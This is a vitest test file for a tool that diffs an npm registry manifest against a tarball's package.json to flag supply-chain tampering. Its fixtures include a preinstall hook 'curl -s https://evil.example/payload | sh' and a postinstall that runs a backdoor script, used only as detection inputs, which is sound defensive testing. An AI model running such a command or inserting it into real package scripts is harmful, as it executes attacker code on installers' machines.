import { describe, it, expect } from 'vitest';
import { diffManifests } from '../src/diff.js';

describe('diffManifests', () => {
  it('should return no mismatches for identical package.json objects', () => {
    const reg = {
      name: 'test-pkg',
      version: '1.0.0',
      description: 'A test package',
      main: 'dist/index.js',
      dependencies: { lodash: '^4.17.21' },
      scripts: { test: 'vitest run' },
    };
    const tarball = { ...reg };

    const mismatches = diffManifests(reg, tarball);
    expect(mismatches).toHaveLength(0);
  });

  it('should detect critical mismatch when tarball injects a postinstall script omitted from registry', () => {
    const reg = {
      name: 'sneaky-pkg',
      version: '1.0.0',
      scripts: {
        build: 'tsc',
        test: 'vitest',
      },
    };
    const tarball = {
      name: 'sneaky-pkg',
      version: '1.0.0',
      scripts: {
        build: 'tsc',
        test: 'vitest',
        postinstall: 'node ./setup-backdoor.js',
      },
    };

    const mismatches = diffManifests(reg, tarball);
    expect(mismatches).toHaveLength(1);
    expect(mismatches[0]).toMatchObject({
      field: 'scripts.postinstall',
      registryValue: undefined,
      tarballValue: 'node ./setup-backdoor.js',
      severity: 'critical',
    });
    expect(mismatches[0].message).toContain('Lifecycle hook script mismatch');
  });

  it('should detect critical mismatch when preinstall or prepare differs', () => {
    const reg = {
      name: 'hook-pkg',
      version: '2.0.0',
      scripts: {
        preinstall: 'echo safe',
      },
    };
    const tarball = {
      name: 'hook-pkg',
      version: '2.0.0',
      scripts: {
        preinstall: 'curl -s https://evil.example/payload | sh',
      },
    };

    const mismatches = diffManifests(reg, tarball);
    expect(mismatches).toHaveLength(1);
    expect(mismatches[0].severity).toBe('critical');
    expect(mismatches[0].field).toBe('scripts.preinstall');
  });

  it('should detect critical mismatch when dependencies differ', () => {
    const reg = {
      name: 'dep-confusion',
      version: '1.0.0',
      dependencies: {
        chalk: '^5.0.0',
      },
    };
    const tarball = {
      name: 'dep-confusion',
      version: '1.0.0',
      dependencies: {
        chalk: '^5.0.0',
        'evil-dependency': '1.0.0',
      },
    };

    const mismatches = diffManifests(reg, tarball);
    expect(mismatches).toHaveLength(1);
    expect(mismatches[0]).toMatchObject({
      field: 'dependencies.evil-dependency',
      registryValue: undefined,
      tarballValue: '1.0.0',
      severity: 'critical',
    });
  });

  it('should detect critical mismatch for bin and exports discrepancies', () => {
    const reg = {
      name: 'bin-pkg',
      version: '1.0.0',
      bin: { 'bin-pkg': './cli.js' },
      exports: './dist/index.js',
    };
    const tarball = {
      name: 'bin-pkg',
      version: '1.0.0',
      bin: { 'bin-pkg': './hidden-cli.js' },
      exports: './dist/malicious.js',
    };

    const mismatches = diffManifests(reg, tarball);
    expect(mismatches.map((m) => m.field)).toEqual(expect.arrayContaining(['bin', 'exports']));
    expect(mismatches.every((m) => m.severity === 'critical')).toBe(true);
  });

  it('should normalize string bin vs object bin when target command matches', () => {
    const reg = {
      name: 'my-cli',
      version: '1.0.0',
      bin: './cli.js',
    };
    const tarball = {
      name: 'my-cli',
      version: '1.0.0',
      bin: { 'my-cli': './cli.js' },
    };

    const mismatches = diffManifests(reg, tarball);
    expect(mismatches).toHaveLength(0);
  });

  it('should classify cosmetic metadata changes as warning severity', () => {
    const reg = {
      name: 'cosmetic-pkg',
      version: '1.0.0',
      description: 'Original safe description',
      keywords: ['security', 'tools'],
      homepage: 'https://example.com',
    };
    const tarball = {
      name: 'cosmetic-pkg',
      version: '1.0.0',
      description: 'Modified cosmetic description',
      keywords: ['security', 'auditing'],
      homepage: 'https://example.com/modified',
    };

    const mismatches = diffManifests(reg, tarball);
    expect(mismatches.length).toBeGreaterThan(0);
    expect(mismatches.every((m) => m.severity === 'warning')).toBe(true);
  });

  it('should ignore npm internal metadata fields like _id, dist, gitHead', () => {
    const reg = {
      name: 'normal-pkg',
      version: '1.0.0',
      _id: 'normal-pkg@1.0.0',
      _nodeVersion: '20.0.0',
      dist: {
        tarball: 'https://registry.npmjs.org/normal-pkg/-/normal-pkg-1.0.0.tgz',
        shasum: 'abcdef123456',
      },
      gitHead: 'abcdef',
    };
    const tarball = {
      name: 'normal-pkg',
      version: '1.0.0',
    };

    const mismatches = diffManifests(reg, tarball);
    expect(mismatches).toHaveLength(0);
  });
});
